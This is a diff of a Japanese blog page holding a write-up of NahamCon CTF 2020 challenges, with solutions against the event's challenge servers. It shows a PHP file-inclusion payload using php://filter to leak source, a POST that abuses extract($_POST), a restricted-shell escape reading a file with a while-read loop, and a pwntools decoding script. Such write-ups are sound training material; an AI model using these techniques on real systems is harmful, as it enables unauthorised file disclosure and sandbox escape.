@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/nahamcon_ctf_2020/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="NahamCon CTF 2020 Writeup" />
 <meta property="og:description" content="(2020/06/17 - 復習しました。下の方に追記してます。) URL: https://ctf.nahamcon.com/challenges 土曜日にある程度やって、BinaryとScriptingは日曜日にゆっくりやろうと思ったら、イ" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/nahamcon_ctf_2020/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/nahamcon_ctf_2020/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2020-06-14T11:00:00+09:00" />
 <meta property="article:modified_time" content="2020-06-17T21:25:00+09:00" />
 <meta itemprop="name" content="NahamCon CTF 2020 Writeup">
-<meta itemprop="description" content="(2020/06/17 - 復習しました。下の方に追記してます。) URL: https://ctf.nahamcon.com/challenges 土曜日にある程度やって、BinaryとScriptingは日曜日にゆっくりやろうと思ったら、イ">
-<meta itemprop="datePublished" content="2020-06-14T11:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2020-06-17T21:25:00&#43;09:00" />
-<meta itemprop="wordCount" content="3546">
-
-
-
+<meta itemprop="description" content="(2020/06/17 - 復習しました。下の方に追記してます。) URL: https://ctf.nahamcon.com/challenges 土曜日にある程度やって、BinaryとScriptingは日曜日にゆっくりやろうと思ったら、イ"><meta itemprop="datePublished" content="2020-06-14T11:00:00+09:00" />
+<meta itemprop="dateModified" content="2020-06-17T21:25:00+09:00" />
+<meta itemprop="wordCount" content="3660">
 <meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="NahamCon CTF 2020 Writeup"/>
 <meta name="twitter:description" content="(2020/06/17 - 復習しました。下の方に追記してます。) URL: https://ctf.nahamcon.com/challenges 土曜日にある程度やって、BinaryとScriptingは日曜日にゆっくりやろうと思ったら、イ"/>
@@ -306,13 +302,13 @@
 <p>URL: <a href="https://ctf.nahamcon.com/challenges">https://ctf.nahamcon.com/challenges</a></p>
 <p>土曜日にある程度やって、BinaryとScriptingは日曜日にゆっくりやろうと思ったら、イベントが終わってました。残念。。。</p>
 <p>（やったところで、大して解けなかったかもですけど）</p>
-<p><br />
-John Hammond がオーガナイザーのひとりだったみたいですね。間接的に、いろいろお世話になっております（YouTubeビデオとか、<a href="https://github.com/JohnHammond/ctf-katana">ctf-katana</a>とか）。Thanks!</p>
-<p><br />
-最終順位は、419位でした。</p>
+<br />
+John Hammond がオーガナイザーのひとりだったみたいですね。間接的に、いろいろお世話になっております（YouTubeビデオとか、[ctf-katana](https://github.com/JohnHammond/ctf-katana)とか）。Thanks!
+<br />
+最終順位は、419位でした。
 <img src="https://captureamerica.github.io/writeups/img/nahamcon_Score1.png" alt="nahamcon_Score1.png">
-<p><br />
-チャレンジリスト</p>
+<br />
+チャレンジリスト
 <img src="https://captureamerica.github.io/writeups/img/nahamcon_Score2.png" alt="nahamcon_Score2.png">
 <br />
 <img src="https://captureamerica.github.io/writeups/img/nahamcon_Score3.png" alt="nahamcon_Score3.png">
@@ -328,7 +324,7 @@ John Hammond がオーガナイザーのひとりだったみたいですね。�
 Connect here:
 <a href="http://jh2i.com:50000">http://jh2i.com:50000</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>アクセスすると、以下の文章が表示されます。</p>
 <pre>
@@ -336,13 +332,13 @@ You don't look like our agent!
 We will only give our flag to our Agent 95! He is still running an old version of Windows...
 </pre>
 <p>チャレンジ名から想像できる通り、User-Agentを設定してアクセスするやつです。</p>
-<p><br />
-&ldquo;Windows 95&rdquo; &ldquo;User-Agent&rdquo; あたりをキーワードにググって、テキトーなUser-Agentを見つけます。</p>
+<br />
+"Windows 95" "User-Agent" あたりをキーワードにググって、テキトーなUser-Agentを見つけます。
 <p>以下でフラグが取れました。</p>
 <pre>
 wget -O - "http://jh2i.com:50000" --user-agent="Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)"
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{user_agents_undercover}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -357,10 +353,10 @@ Connect here:
 <br /><br />
 Note, this flag is not in the usual format.</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>ChromeのDeveloper Toolでjsファイルをテキトーに追っていったら、フラグが見つかりました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>JCTF{spoooooky_ghosts_in_storage}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -373,25 +369,25 @@ Note, this flag is not in the usual format.</p>
 Connect here:
 <a href="http://jh2i.com:50002">http://jh2i.com:50002</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>アクセスすると以下が表示されました。</p>
 <pre>
 Sorry! You are in /index.php/?file=
 The phonebook is located at phphonebook.php
 </pre>
-<p><br />
+<br />
 以下でアクセスしたら、phphonebook.phpの中身が見れました。
 <br />
-<a href="http://jh2i.com:50002/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook">http://jh2i.com:50002/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook</a></p>
+[http://jh2i.com:50002/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook](http://jh2i.com:50002/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook)
 <pre>
 PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU+CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ+CgogIDxib2R5IGNsYXNzPSJiZyI+CiAgICA8aDEgaWQ9ImhlYWRlciI+IFdlbGNvbWUgdG8gdGhlIFBocGhvbmVib29rIDwvaDE+CgogICAgPGRpdiBpZD0iaW1fY29udGFpbmVyIj4KCiAgICAgIDxpbWcgc3JjPSJib29rLmpwZyIgd2lkdGg9IjUwJSIgaGVpZ2h0PSIzMCUiLz4KCiAgICAgIDxwIGNsYXNzPSJkZXNjIj4KICAgICAgVGhpcyBwaHBob25lYm9vayB3YXMgbWFkZSB0byBsb29rIHVwIGFsbCBzb3J0cyBvZiBudW1iZXJzISBIYXZlIGZ1bi4uLgogICAgICA8L3A+CgogICAgPC9kaXY+Cjxicj4KPGJyPgogICAgPGRpdj4KICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiMiPgogICAgICAgIDxsYWJlbCBpZD0iZm9ybV9sYWJlbCI+RW50ZXIgbnVtYmVyOiA8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJudW1iZXIiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgogICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGlkPSJwaHBfY29udGFpbmVyIj4KICAgIDw/cGhwCiAgICAgIGV4dHJhY3QoJF9QT1NUKTsKCiAgICAJaWYgKGlzc2V0KCRlbWVyZ2VuY3kpKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8+CiAgPC9kaXY+CiAgPC9icj4KICA8L2JyPgogIDwvYnI+CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI+PGJyPjxicj48YnI+CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw+
 </pre>
-<p><br />
-抜粋です。</p>
+<br />
+抜粋です。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -410,31 +406,31 @@ PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-HTML" data-lang="HTML"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;#&#34;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;form_label&#34;</span><span class="p">&gt;</span>Enter number: <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;number&#34;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;php_container&#34;</span><span class="p">&gt;</span>
-    <span class="cp">&lt;?php
-</span><span class="cp">      extract($_POST);
-</span><span class="cp">
-</span><span class="cp">    	if (isset($emergency)){
-</span><span class="cp">    		echo(file_get_contents(&#34;/flag.txt&#34;));
-</span><span class="cp">    	}
-</span><span class="cp">    ?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;#&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;form_label&#34;</span><span class="p">&gt;</span>Enter number: <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;number&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;php_container&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="cp">      extract($_POST);
+</span></span></span><span class="line"><span class="cl"><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">    	if (isset($emergency)){
+</span></span></span><span class="line"><span class="cl"><span class="cp">    		echo(file_get_contents(&#34;/flag.txt&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="cp">    	}
+</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-emergencyをPOSTしたらいいみたいです。チャレンジの本文からGuessするだけでも解けたかもです。</p>
+</div><br />
+emergencyをPOSTしたらいいみたいです。チャレンジの本文からGuessするだけでも解けたかもです。
 <pre>
 $ curl -d emergency=1 http://jh2i.com:50002/phphonebook.php
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{phon3_numb3r_3xtr4ct3d}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -447,7 +443,7 @@ $ curl -d emergency=1 http://jh2i.com:50002/phphonebook.php
 Connect with:
 nc jh2i.com 50034</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>イベント終了後でしたが、サーバは生きていたのでやってみました。</p>
 <p>手動で繋いでみると、以下のような結果になります。</p>
@@ -461,14 +457,14 @@ kwfv tsuc lzak dafw wpsuldq. uzsjsulwj 19 gx lzw xdsy ak 'g'
 send back this line exactly. character 19 of the flag is 'o'
 :
 </pre>
-<p><br />
-表示された文をrot(n)して送り返していると、その中にフラグの一文字が含まれているものが出てくる、というものです。</p>
-<p>何度か下調べをして、'}&rsquo; が30文字目（0始まり）に出てくるようなので、それでフラグの長さ(31)がわかります。</p>
-<p><br />
-以下、書いたスクリプトです。rot()関数は前から持っていたので、今回書いたのはその下の箇所です。</p>
+<br />
+表示された文をrot(n)して送り返していると、その中にフラグの一文字が含まれているものが出てくる、というものです。
+<p>何度か下調べをして、&rsquo;}&rsquo; が30文字目（0始まり）に出てくるようなので、それでフラグの長さ(31)がわかります。</p>
+<br />
+以下、書いたスクリプトです。rot()関数は前から持っていたので、今回書いたのはその下の箇所です。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -504,52 +500,52 @@ send back this line exactly. character 19 of the flag is 'o'
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">def</span> <span class="nf">rot</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-        <span class="k">if</span> <span class="mh">0x41</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x5a</span><span class="p">:</span>
-            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x41</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x41</span>
-        <span class="k">elif</span> <span class="mh">0x61</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x7a</span><span class="p">:</span>
-            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x61</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x61</span>
-    <span class="k">return</span> <span class="n">s</span>
-
-<span class="n">flag_len</span> <span class="o">=</span> <span class="mi">31</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="p">]</span> <span class="o">*</span> <span class="n">flag_len</span>
-<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;jh2i.com&#39;</span><span class="p">,</span> <span class="mi">50034</span><span class="p">)</span>
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">q</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">26</span><span class="p">):</span>
-        <span class="n">a</span> <span class="o">=</span> <span class="n">rot</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
-        <span class="k">if</span> <span class="s2">&#34;character&#34;</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
-            <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[0-9]+&#39;</span><span class="p">,</span> <span class="n">a</span><span class="p">))</span>
-            <span class="n">pos</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-            <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]):</span>
-                <span class="n">flag</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">])</span>
-                <span class="k">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
-                <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
-            <span class="c1">#print(&#34;char = {}&#34;.format(chr(a[-3])))</span>
-        <span class="k">if</span> <span class="s2">&#34;send&#34;</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
-            <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-            <span class="k">break</span>
-    <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;=</span> <span class="n">flag_len</span><span class="p">:</span>
-        <span class="k">break</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rot</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="mh">0x41</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x5a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x41</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x41</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="mh">0x61</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x7a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x61</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x61</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag_len</span> <span class="o">=</span> <span class="mi">31</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="p">]</span> <span class="o">*</span> <span class="n">flag_len</span>
+</span></span><span class="line"><span class="cl"><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;jh2i.com&#39;</span><span class="p">,</span> <span class="mi">50034</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">26</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">rot</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;character&#34;</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[0-9]+&#39;</span><span class="p">,</span> <span class="n">a</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pos</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flag</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#print(&#34;char = {}&#34;.format(chr(a[-3])))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;send&#34;</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;=</span> <span class="n">flag_len</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-解説:</p>
+</div><br />
+解説:
 <ul>
 <li>実際に見つかった文字は、flagというリストに入れていってます。</li>
 <li>rotした結果、&ldquo;send&quot;とか&quot;character&quot;が見つかったやつが、正しくrotされたものです。</li>
 <li>ちょっとナゾだったのが、aには文字が入っているはずなのにa[-3]は数値で取れてたので、chr()で文字に変換してます。</li>
 <li>[-3]なのは、改行も入れて後ろから3文字目だからです。</li>
 </ul>
-<p><br />
-実行結果:</p>
+<br />
+実行結果:
 <pre>
 $ ./rotten_solve.py
 [+] Opening connection to jh2i.com on port 50034: Done
@@ -586,7 +582,7 @@ flag{now_you_know_yourcaesars}
 flag{now_you_know_your_caesars}
 [*] Closed connection to jh2i.com port 50034
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{now_you_know_your_caesars}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -599,10 +595,10 @@ flag{now_you_know_your_caesars}
 Connect here:
 nc jh2i.com 50017</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <p>Wiresharkでキャプチャーしながら繋いで、Wiresharkでflagをサーチしました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{more_text_in_the_vortex}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -615,7 +611,7 @@ nc jh2i.com 50017</p>
 Connect here:
 nc jh2i.com 50026</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <p>｢..｣ というファイル名の中身をどうやって表示させるか、というチャレンジです。</p>
 <pre>
@@ -637,14 +633,14 @@ user@host:/home/user$ emacs
 emacs
 bash: emacs: command not found
 </pre>
-<p><br />
-以下でフラグをゲットしました。</p>
+<br />
+以下でフラグをゲットしました。
 <pre>
 user@host:/home/user$ find . -type f -exec cat {} \;
 find . -type f -exec cat {} \;
 flag{we_should_have_been_worried_about_u2k_not_y2k}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{we_should_have_been_worried_about_u2k_not_y2k}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -657,7 +653,7 @@ flag{we_should_have_been_worried_about_u2k_not_y2k}
 Connect here:
 nc jh2i.com 50024</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-6">Solution</h3>
 <p>確か、catとかいろいろなコマンドが使えないやつでした。</p>
 <pre>
@@ -674,13 +670,13 @@ drwxr-xr-x 1 user   user    4096 Jun  4 18:54 ..
 cat flag.txt
 /bin/rbash: line 2: cat: command not found
 </pre>
-<p><br />
-以下でフラグをゲットしました。</p>
+<br />
+以下でフラグをゲットしました。
 <pre>
 while read line; do echo $line; done < flag.txt
 flag{congrats_you_just_escaped_alkatraz}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{congrats_you_just_escaped_alkatraz}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -694,7 +690,7 @@ flag{congrats_you_just_escaped_alkatraz}
 <ul>
 <li>candroid.apk</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-7">Solution</h3>
 <p>解凍して、flag{}を探すだけです。</p>
 <pre>
@@ -710,7 +706,7 @@ Binary file ./resources.arsc matches
 $ strings resources.arsc | grep flag
 flag{4ndr0id_1s_3asy}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{4ndr0id_1s_3asy}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -724,7 +720,7 @@ flag{4ndr0id_1s_3asy}
 <ul>
 <li>simple-app.apk</li>
 </ul>
-<p><br /></p>
